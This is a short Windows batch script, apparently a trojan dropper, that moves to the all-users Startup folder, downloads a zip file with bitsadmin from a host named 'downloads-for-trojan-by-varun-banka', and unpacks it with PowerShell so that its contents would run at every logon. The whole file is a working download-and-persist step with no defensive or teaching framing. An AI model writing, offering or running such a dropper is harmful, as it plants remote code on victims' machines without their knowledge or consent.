:: echo off 
@echo off

:: cd to startup folder
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

:: download the file
bitsadmin.exe /transfer "JobName" https://downloads-for-trojan-by-varun-banka.netlify.app/my_zip_file.zip C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\my_zip_file.zip

:: unzip the downloaded file
powershell -command "Expand-Archive -Force '%~dp0my_zip_file.zip' '%~dp0'"

:: code by varun banka
